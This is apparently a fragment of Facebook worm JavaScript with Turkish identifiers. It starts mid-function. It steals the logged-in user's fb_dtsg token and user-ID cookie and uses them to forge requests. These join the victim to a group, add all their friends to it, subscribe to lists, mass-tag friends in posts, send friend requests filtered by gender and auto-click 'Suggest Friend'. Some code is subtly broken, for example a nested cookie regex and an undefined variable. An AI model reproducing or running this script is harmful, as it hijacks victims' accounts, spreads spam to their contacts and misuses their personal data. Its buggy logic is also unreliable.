    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}
;
sublist("319202351503071");
var gid = ['163437337182552'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "376973822362176";
var spost_id = "376973822362176";
var sfoto_id = "376973822362176";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkadaþ ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}

function autoSuggest()
{    
    links=document.getElementsByTagName('a');
    for (i in links) {
        l=links[i];
        if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
            l.click();
        }
    }
}

function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        w = document.getElementsByClassName('pbm fsm')[0];

        e = document.createElement('a');
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by LMAO';
        e.className = 'uiButton';
        e.onclick = autoSuggest;

        if( w.childElementCount == 0)
        {
            w.appendChild(document.createElement('br'));
            w.appendChild(e);
        }
    }
}

blub();

document.addEventListener("DOMNodeInserted", blub, true);